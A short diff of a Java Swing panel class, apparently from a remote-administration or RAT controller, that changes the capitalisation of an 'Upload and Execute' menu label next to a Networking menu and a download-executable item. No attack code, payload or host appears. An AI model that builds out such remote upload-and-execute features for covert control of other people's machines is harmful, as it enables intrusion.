@@ -92,7 +92,7 @@ public abstract class PanelMainClients extends JScrollPane {
 		mnNetworking.add(mntmexe);
 		mntmexe.setIcon(Resources.getIcon("arrow-down"));
 
-		JMenuItem mntmUploadAndExecute = new JMenuItem("Upload and Execute");
+		JMenuItem mntmUploadAndExecute = new JMenuItem("upload and Execute");
 		mntmUploadAndExecute.setIcon(Resources.getIcon("drive-upload"));
 		/*mntmUploadAndExecute.addActionListener(new ActionListener() {
 			public void actionPerformed(ActionEvent arg0) {
